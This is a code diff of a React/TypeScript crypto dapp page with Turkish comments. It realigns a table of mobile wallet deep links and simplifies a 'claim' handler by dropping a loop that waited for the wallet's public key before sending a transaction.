@@ -98,9 +98,9 @@ export default function Page() {
     deepLink: string
   }
   const walletConfigs: WalletConfig[] = [
-    { match: (n) => n === 'Phantom', label: 'Phantom',     icon: '/phantom.svg',   deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
+    { match: (n) => n === 'Phantom', label: 'Phantom',     icon: '/phantom.svg',     deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}` },
     { match: (n) => n.toLowerCase().includes('trust'),    label: 'Trust Wallet', icon: '/trustwallet.svg', deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}` },
-    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg', deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
+    { match: (n) => n.toLowerCase().includes('coinbase'), label: 'Coinbase Wallet', icon: '/coinbase.svg',  deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}` },
     { match: (n) => n.toLowerCase().includes('bitkeep') || n.toLowerCase().includes('bitget'), label: 'Bitget Wallet', icon: '/bitget.svg', deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}` },
     { match: (n) => n === 'Solflare',  label: 'Solflare',  icon: '/solflare.svg', deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
     { match: (n) => n === 'Backpack',  label: 'Backpack',  icon: '/backpack.svg', deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}` },
@@ -173,12 +173,14 @@ export default function Page() {
   const handleClaim = async () => {
     if (loading) return
     setMsg('')
+
     // 1) Eğer zaten bağlıysak direkt işlem
     if (publicKey) {
       setLoading(true)
       await doTx()
       return
     }
+
     // 2) Sadece bir Installed adapter varsa → otomatik bağlan ve işlem
     const installed = orderedWallets.filter(
       (w) => w.readyState === WalletReadyState.Installed
@@ -187,14 +189,6 @@ export default function Page() {
       setLoading(true)
       try {
         await select(installed[0].adapter.name as WalletName)
-        // publicKey’in gelmesini bekle
-        await new Promise<void>((resolve) => {
-          const check = () => {
-            if (publicKey) resolve()
-            else setTimeout(check, 200)
-          }
-          check()
-        })
         await doTx()
       } catch (e) {
         console.error(e)
@@ -202,6 +196,7 @@ export default function Page() {
       }
       return
     }
+
     // 3) Normal tarayıcı veya çoklu cüzdan senaryolarında modal aç
     openDrawer()
   }
